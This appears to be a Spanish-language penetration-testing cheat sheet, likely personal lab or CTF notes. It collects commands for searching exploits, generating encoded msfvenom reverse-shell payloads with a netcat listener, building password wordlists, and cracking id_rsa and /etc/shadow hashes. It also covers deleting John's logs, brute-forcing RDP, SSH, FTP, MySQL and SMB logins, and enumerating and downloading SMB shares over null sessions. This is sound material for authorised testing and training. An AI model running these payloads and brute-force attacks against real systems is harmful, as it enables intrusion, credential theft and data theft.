# **🔍 BUSCAR EXPLOIT**
  ..............

  1. Para buscar un exploit específico, usa el siguiente comando:
     ```bash
     searchsploit wordpress mail masta
     ```

  2. Para obtener detalles de un exploit:
     ```bash
     searchsploit -x <path>
     ```

# **💻 ENCODEAR PAYLOAD**
  ................

  1. Utiliza [www.revshells.com](http://www.revshells.com) para generar comandos **msfvenom**.

  2. Generar un payload básico con msfvenom:
     ```bash
     msfvenom -p "payload" LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe
     ```

  3. Crear un payload con cifrado (shikata-ga-nai):
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -e x86/shikata-ga-nai -f exe > encoded.exe
     ```
# 🔊 PONER MI PC EN ESCUCHA
......................

Para poner tu PC en escucha en un puerto específico:
```bash
nc -lvnp 443
```

# 🔑 CREAR DICCIONARIOS
....................

1. **Generación de Contraseñas con Crunch:**
   ```bash
   crunch <min-len> <max-len> [<charset string>] [options]
   ```

2. **CUPP (Common User Password Profiler):**  
   **Instrucciones de instalación:**
   ```bash
   sudo apt install cupp -y
   cupp -i  # Rellenar con los datos disponibles.
   ```

3. **Username Anarchy (Crea nombres de usuario):**  
   Es necesario tener Ruby instalado.  
   **Instrucciones de instalación:**
   ```bash
   sudo apt install ruby -y
   git clone https://github.com/urbanadventurer/username-anarchy.git
   cd username-anarchy
   ```

   **Uso:**
   ```bash
   ./username-anarchy Jane Smith > jane_smith_usernames.txt
   ```

4. **Filtrar Diccionarios:**
   Filtra un diccionario según criterios específicos (longitud, letras, números, caracteres especiales):
   ```bash
   grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
   ```

   **Criterios:**
   - Longitud mínima: 6 caracteres → `grep -E '^.{6,}$'`
   - Al menos una letra mayúscula → `grep -E '[A-Z]'`
   - Al menos una letra minúscula → `grep -E '[a-z]'`
   - Al menos un número → `grep -E '[0-9]'`
   - Al menos dos caracteres especiales → `grep -E '([!@#$%^&*].*){2,}'`

# 🔓 CRACKEAR HASHES
....................

1. **Hash Online:**  
   Usa las siguientes páginas para crackear hashes:
   - [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
   - [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

2. **Usando John The Ripper:**  
   Para convertir un archivo `id_rsa` en un hash:
   ```bash
   2john id_rsa > hashes.txt
   ```

   Crackear el hash con un wordlist (ejemplo con `rockyou.txt`):
   ```bash
   john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
   sudo john --format=[format] --wordlist=[path to wordlist] [path to file]
   ```

   Ver los formatos de hash admitidos por John:
   ```bash
   john --list=formats
   ```

   **Borrar logs de John:**
   ```bash
   rm ~/.john/john.*
   ```

3. **Crackear Hashes de /etc/passwd y /etc/shadow:**
   ```bash
   unshadow passwd.txt shadow.txt > unshadow.txt
   john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```

4. **Usando Hashcat:**
   Crackear hashes con Hashcat:
   ```bash
   hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
   ```

   - **-m** especifica el tipo de hash.
   - Más detalles sobre Hashcat en: [https://hashcat.net/wiki/doku.php?id=hashcat](https://hashcat.net/wiki/doku.php?id=hashcat)
  
# 🖥️ RDP (Remote Desktop Protocol)

### 1. **Reconocimiento:**
```bash
xfreerdp /v:[IP] -sec-nla /u:""
```

### 2. **Conexión a RDP:**
```bash
xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore
```

### 3. **Conexión con resolución dinámica y portapapeles:**
```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
```

### 4. **Conexión alternativa (rdesktop):**
```bash
rdesktop <RHOST>
```

### 5. **Cracking RDP con ncrack:**
```bash
ncrack -vv --user user -P wordlist.txt [IP]:3389
```
  _Ejemplo_: 
```bash
ncrack -vv --user Administrator -P rockyou.txt 192.168.1.50:3389
```

### 6. **Cracking RDP con hydra:**
```bash
hydra -l usuario -P lista.txt rdp://IP -t 4
```
  _Ejemplo_: 
```bash
hydra -l Administrator -P rockyou.txt rdp://192.168.1.50 -t 4
```

### 7. **Cracking RDP con crowbar:**
```bash
crowbar -b rdp -u user -C password_wordlist -s [IP] -v
```

---

# 🔑 SSH (Secure Shell)

### 1. **Cracking SSH con hydra:**
```bash
hydra -l usuario -P lista_de_contraseñas.txt ssh://IP -t 4
```
  _Ejemplo_: 
```bash
hydra -l root -P passwords.txt ssh://192.168.1.100 -t 4
```

### 2. **Cracking SSH con medusa:**
```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
  - `-h`: Dirección IP del destino  
  - `-n`: Puerto SSH (por defecto el 22)  
  - `-u`: Nombre de usuario para el ataque  
  - `-P`: Lista de contraseñas  
  - `-M`: Módulo SSH en Medusa  
  - `-t`: Número de intentos simultáneos

### 3. **Conexión SSH:**
```bash
ssh sshuser@<IP> -p PORT
```
```bash
ssh root@10.10.10.10 -i id_rsa
```

---

# 🌐 FTP (File Transfer Protocol)

### 1. **Cracking FTP con hydra:**
```bash
hydra -l usuario -P lista.txt ftp://IP -t 4
```
  _Ejemplo_: 
```bash
hydra -l anonymous -P passwords.txt ftp://192.168.1.20 -t 4
```

### 2. **Cracking FTP con medusa:**
```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

### 3. **Conexión FTP:**
```bash
ftp ftp://USER:<PASSWORD>@<IP>
```

  _Si la contraseña da problemas_:  
```bash
ftp ftp://USER@IP
```
Y luego poner la contraseña cuando se pida.

---

# 🗃️ MySQL (MySQL Database)

### 1. **Cracking MySQL con hydra:**
```bash
hydra -l usuario -P lista.txt mysql://IP -t 4
```
  _Ejemplo_: 
```bash
hydra -l root -P passwords.txt mysql://192.168.1.100 -t 4
```

### 2. **Cracking PostgreSQL con hydra:**
```bash
hydra -l usuario -P lista.txt postgres://IP -t 4
```

# 🌐 **PUERTO 445 / SMB (Server Message Block)**

## 1. **Listar Recursos Compartidos 📂**

### **Listar recursos sin autenticación (Nullsession):**
```bash
smbclient -L 10.10.10.10 -N
```
  - `-L`: Muestra los recursos compartidos en la consola.
  - `-N`: Usar sesión nula (sin autenticación).

### **Conexión a un recurso compartido:**
```bash
smbclient //IP/RECURSO -N
```

### **Acceder con usuario y contraseña 🔑:**
```bash
smbclient //10.10.10.10/directorio -U user
```

### **Comandos dentro de smbclient para descargar archivos 📥:**
```bash
smb:\> get archivo.txt   # Descarga un archivo específico
smb:\> mget *            # Descarga todos los archivos
```

### **Descargar todo un recurso compartido:**
```bash
smbget -R smb://IP/recurso
```
```bash
prompt off   # Desactiva el modo interactivo para descargar archivos sin confirmación
```

---

## 2. **Herramientas para Enumerar Recursos SMB 🛠️**

### **Usar enum4linux para enumerar recursos SMB:**
```bash
enum4linux 10.10.10.10
```
```bash
enum4linux -a 10.10.10.10   # Uso de todas las opciones para obtener más información
```

### **Usar smbmap para enumerar carpetas (Nullsession):**
```bash
smbmap -H 10.10.10.10
```
  - Enumeración de carpetas sin autenticación (Nullsession).

### **Acceder a carpetas con usuario y contraseña usando smbmap 🔓:**
```bash
smbmap -H 10.10.10.10 -u user -p password
```

---

## 3. **CrackMapExec 🔍**

### **Listar recursos SMB sin autenticación:**
```bash
crackmapexec smb 10.10.10.10 -u ' ' -p ' ' --shares
```
  - Deja un espacio entre las comillas simples para usar Nullsession.

### **Ataque de diccionario a un usuario determinado 🔑:**
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password.txt'
```

---

## 4. **Ataques de Fuerza Bruta ⚡**

### **Cracking SMB con Hydra:**
```bash
hydra -l usuario -P lista.txt smb://IP -t 4
```
  _Ejemplo_:
```bash
hydra -l administrador -P passwords.txt smb://192.168.1.150 -t 4
```
### 🌟 **Resumen de la Estructura:**

1. **Listar recursos SMB 📂**: Usando herramientas como `smbclient` y `enum4linux`.
2. **Acceder a carpetas SMB 🔓**: Para conexiones tanto con sesión nula como con autenticación.
3. **Uso de CrackMapExec 🔍**: Para enumerar recursos y realizar ataques de diccionario.
4. **Cracking con Hydra ⚡**: Ejemplo de cómo realizar un ataque de diccionario a un servicio SMB.

